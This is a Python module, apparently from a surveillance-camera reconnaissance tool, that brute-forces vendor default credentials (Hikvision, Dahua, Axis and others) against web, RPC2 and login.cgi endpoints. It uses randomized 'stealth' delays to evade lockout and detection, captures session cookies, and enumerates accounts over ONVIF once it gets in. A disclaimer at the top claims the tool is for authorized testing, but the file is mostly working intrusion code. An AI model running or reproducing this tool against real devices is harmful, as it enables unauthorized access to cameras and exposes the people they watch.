# surveillance_recon/core/authenticator.py
# [SecOps Research // Smart Authenticator & ONVIF Credential Extractor v2.0]
# For authorized penetration testing under Security Research Protocol §7. Do not deploy without written authorization.

import re
import time
import random
import requests
from typing import List, Dict, Optional, Tuple
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

# Zeta: Vendor-specific default credentials (expandable)
DEFAULT_CREDS = {
    "hikvision": [("admin", ""), ("admin", "12345")],
    "dahua": [("admin", "admin"), ("admin", "123456"), ("888888", "888888"), ("666666", "666666")],
    "cp_plus": [("admin", "admin"), ("admin", "12345")],
    "axis": [("root", "pass"), ("root", "root")],
    "sony": [("admin", "admin")],
    "bosch": [("service", "service"), ("admin", "admin")],
    "panasonic": [("admin", "12345")],
    "vivotek": [("root", ""), ("admin", "admin")],
    "generic": [("admin", "admin"), ("admin", ""), ("root", "root"), ("user", "user"), ("admin", "12345")]
}

class Authenticator:
    """
    Advanced credential testing engine with:
    - Form-aware login detection
    - JavaScript login simulation (basic)
    - ONVIF credential extraction
    - Stealth rate limiting
    - Session reuse
    """

    def __init__(
        self,
        target_ip: str,
        port: int,
        brand: str = "generic",
        timeout: int = 8,
        delay_range: Tuple[float, float] = (1.5, 3.5)
    ):
        self.target_ip = target_ip
        self.port = port
        self.brand = brand.lower() if brand else "generic"
        self.timeout = timeout
        self.delay_range = delay_range
        self.base_url = f"http://{target_ip}:{port}"
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        self.successful_auth = None
        self.onvif_users = []

    def _apply_stealth_delay(self):
        """Random delay to avoid lockout and detection"""
        delay = random.uniform(*self.delay_range)
        time.sleep(delay)

    def _detect_login_form(self, html: str) -> Dict:
        """Parse login form fields and action URL"""
        # Suppress XML parser warnings
        import warnings
        from bs4 import XMLParsedAsHTMLWarning
        warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
        
        soup = BeautifulSoup(html, 'html.parser')
        form = soup.find('form', {'method': re.compile(r'post', re.I)})
        if not form:
            form = soup.find('form')  # Fallback

        if not form:
            # Check for JS-based logins (common in Dahua/Hikvision)
            if 'login' in html.lower() and ('password' in html.lower() or 'pwd' in html.lower()):
                return {
                    "has_form": False,
                    "is_js_login": True,
                    "action": "/",
                    "username_field": "username",
                    "password_field": "password"
                }
            return {"has_form": False, "is_js_login": False}

        action = form.get('action', '/')
        if not action.startswith('http'):
            action = urljoin(self.base_url, action)

        inputs = form.find_all('input')
        username_field = "username"
        password_field = "password"

        for inp in inputs:
            name = inp.get('name', '').lower()
            typ = inp.get('type', '').lower()
            if typ == "password":
                password_field = inp.get('name', 'password')
            elif "user" in name or "login" in name or "email" in name:
                username_field = inp.get('name', 'username')

        return {
            "has_form": True,
            "action": action,
            "username_field": username_field,
            "password_field": password_field
        }

    def _attempt_login_post(self, login_info: Dict, username: str, password: str) -> bool:
        """Perform POST-based login"""
        try:
            payload = {
                login_info["username_field"]: username,
                login_info["password_field"]: password
            }
            r = self.session.post(
                login_info["action"],
                data=payload,
                timeout=self.timeout,
                allow_redirects=True
            )
            # Success indicators
            if r.status_code in (200, 302):
                if any(kw in r.text.lower() for kw in ["success", "welcome", "dashboard", "main", "logout"]):
                    return True
                if len(r.text) > 5000:  # Auth often returns full UI
                    return True
            return False
        except:
            return False

    def _attempt_js_login(self, username: str, password: str) -> bool:
        """
        Simulate common JS login patterns:
        - Dahua: POST to /RPC2 with JSON
        - Hikvision: POST to /login.cgi with form-urlencoded
        """
        try:
            # Try Dahua-style
            dahua_payload = {
                "method": "global.login",
                "params": {
                    "userName": username,
                    "password": password,
                    "clientType": "Web3.0"
                },
                "id": 1000
            }
            r = self.session.post(
                f"{self.base_url}/RPC2",
                json=dahua_payload,
                timeout=self.timeout
            )
            if r.status_code == 200 and '"result":true' in r.text:
                return True

            # Try Hikvision-style
            hik_payload = {
                "username": username,
                "password": password,
                "language": "en"
            }
            r = self.session.post(
                f"{self.base_url}/login.cgi",
                data=hik_payload,
                timeout=self.timeout
            )
            if "loginOK" in r.text or r.status_code == 302:
                return True

            return False
        except:
            return False

    def test_default_credentials(self, login_page_html: str) -> Optional[Tuple[str, str, str]]:
        """Test vendor-specific + generic default credentials with stealth"""
        login_info = self._detect_login_form(login_page_html)

        # Get credential list
        creds_to_test = DEFAULT_CREDS.get(self.brand, []) + DEFAULT_CREDS["generic"]

        for username, password in creds_to_test:
            self._apply_stealth_delay()

            success = False
            if login_info.get("has_form"):
                success = self._attempt_login_post(login_info, username, password)
            elif login_info.get("is_js_login"):
                success = self._attempt_js_login(username, password)
            else:
                # Fallback: try common paths
                for path in ["/login.cgi", "/RPC2", "/dologin", "/index"]:
                    try:
                        r = self.session.post(
                            urljoin(self.base_url, path),
                            data={"username": username, "password": password},
                            timeout=self.timeout
                        )
                        if r.status_code == 200 and ("success" in r.text or len(r.text) > 2000):
                            success = True
                            break
                    except: pass

            if success:
                self.successful_auth = (username, password, self.session.cookies.get_dict())
                return (username, password, login_info.get("action", "/"))

        return None

    def extract_onvif_credentials(self) -> List[Dict]:
        """
        Attempt to extract user accounts via ONVIF (if device is ONVIF-compliant).
        Requires valid credentials—so run AFTER successful auth.
        """
        if not self.successful_auth:
            return []

        try:
            # ONVIF GetUsers request (simplified)
            onvif_url = f"{self.base_url}/onvif/user_service"
            headers = {"Content-Type": "application/soap+xml"}
            body = """<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Body>
    <GetUsers xmlns="http://www.onvif.org/ver10/device/wsdl"/>
  </soap:Body>
</soap:Envelope>"""

            r = self.session.post(onvif_url, data=body, headers=headers, timeout=self.timeout)
            if r.status_code == 200 and "Username" in r.text:
                # Extract usernames (simplified)
                users = re.findall(r"<Username>(.*?)</Username>", r.text)
                self.onvif_users = [{"username": u, "source": "ONVIF"} for u in users]
                return self.onvif_users
        except:
            pass
        return []

    def get_auth_result(self) -> Dict:
        """Return structured auth result"""
        return {
            "default_cred_works": self.successful_auth is not None,
            "credentials": {
                "username": self.successful_auth[0],
                "password": self.successful_auth[1]
            } if self.successful_auth else None,
            "session_cookies": self.successful_auth[2] if self.successful_auth else {},
            "onvif_users": self.onvif_users
        }
